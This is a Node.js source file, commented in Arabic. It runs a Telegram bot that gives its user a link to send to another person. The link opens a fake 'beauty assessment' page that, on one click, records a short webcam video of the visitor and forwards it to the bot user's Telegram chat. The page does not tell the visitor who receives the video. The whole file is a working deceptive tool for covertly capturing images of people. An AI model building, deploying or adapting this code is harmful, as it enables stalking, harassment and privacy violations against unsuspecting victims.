require('dotenv').config();
const express = require('express');
const multer = require('multer');
const fetch = require('node-fetch');
const { Telegraf } = require('telegraf');
const crypto = require('crypto');
const FormData = require('form-data');

const BOT_TOKEN = process.env.BOT_TOKEN;
const PORT = process.env.PORT || 3000;

if (!BOT_TOKEN) {
  console.error('❌ BOT_TOKEN غير موجود في .env');
  process.exit(1);
}

// إنشاء البوت
const bot = new Telegraf(BOT_TOKEN);
const tokenMap = new Map(); // token -> chat_id

bot.start((ctx) => {
  const chatId = ctx.chat.id;
  const token = crypto.randomBytes(8).toString('hex');
  tokenMap.set(token, chatId);

  // ضع رابط استضافتك الخارجي هنا بعد رفعه على Render
  const link = `https://tele-mu-pink.vercel.app/assess?t=${token}`;
  ctx.reply(`🔗 أرسل هذا الرابط للشخص الآخر:\n${link}`);
});

bot.launch();
console.log('🤖 البوت يعمل...');

// إعداد السيرفر
const app = express();
const upload = multer();

// صفحة assess.html مدمجة في الكود
app.get('/assess', (req, res) => {
  const html = `
<!doctype html>
<html lang="ar" dir="rtl">
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>تقييم الجمال</title>
<style>
  body { font-family: Arial, sans-serif; max-width: 600px; margin: 24px auto; padding: 16px; text-align: center; }
  video { width: 100%; border-radius: 12px; margin-top: 10px; }
  button { padding: 12px 16px; border-radius: 10px; border: none; background: #4CAF50; color: white; cursor: pointer; font-size: 16px; }
  button:hover { background: #45a049; }
</style>
<h1>تقييم الجمال</h1>
<p>بالضغط على الزر أدناه، ستسمح باستخدام الكاميرا لتسجيل فيديو قصير لغرض التقييم.</p>
<button id="agree">أوافق</button>
<p id="status"></p>
<video id="preview" autoplay playsinline muted></video>

<script>
const btn = document.getElementById('agree');
const statusEl = document.getElementById('status');
const videoEl = document.getElementById('preview');

function getToken() {
  const u = new URL(window.location.href);
  return u.searchParams.get('t');
}

btn.onclick = async () => {
  try {
    const t = getToken();
    if (!t) { statusEl.textContent = '❌ رابط غير صالح.'; return; }

    const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
    videoEl.srcObject = stream;

    const rec = new MediaRecorder(stream);
    const chunks = [];
    rec.ondataavailable = e => { if (e.data.size) chunks.push(e.data); };

    rec.onstop = async () => {
      const blob = new Blob(chunks, { type: 'video/mp4' });
      const form = new FormData();
      form.append('media', blob, 'clip.mp4');

      const res = await fetch('/upload?t=' + encodeURIComponent(t), { method: 'POST', body: form });
      const data = await res.json();

      if (data.ok) { statusEl.textContent = '✅ تم إرسال الفيديو بنجاح.'; }
      else { statusEl.textContent = '❌ فشل إرسال الفيديو.'; }

      stream.getTracks().forEach(tr => tr.stop());
    };

    rec.start();
    setTimeout(() => rec.stop(), 2000);
    statusEl.textContent = '🎥 جاري التسجيل...';
  } catch (err) {
    console.error(err);
    statusEl.textContent = '❌ لم تتم الموافقة على الكاميرا.';
  }
};
</script>
</html>
  `;
  res.send(html);
});

// استقبال الفيديو
app.post('/upload', upload.single('media'), async (req, res) => {
  try {
    const token = req.query.t;
    const chatId = tokenMap.get(token);
    if (!chatId) return res.status(400).json({ error: '❌ رابط غير صالح أو انتهت صلاحيته' });

    const form = new FormData();
    form.append('chat_id', String(chatId));
    form.append('caption', '📹 تم استلام الفيديو من رابطك');
    form.append('video', req.file.buffer, 'clip.mp4');

    const tg = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, { method: 'POST', body: form });
    const data = await tg.json();

    if (!data.ok) return res.status(500).json({ error: '❌ فشل إرسال الفيديو' });

    tokenMap.delete(token);
    res.json({ ok: true });
  } catch (e) {
    console.error(e);
    res.status(500).json({ error: '❌ حدث خطأ في المعالجة' });
  }
});

app.listen(PORT, () => {
  console.log(`🌐 السيرفر يعمل على http://localhost:${PORT}`);
});
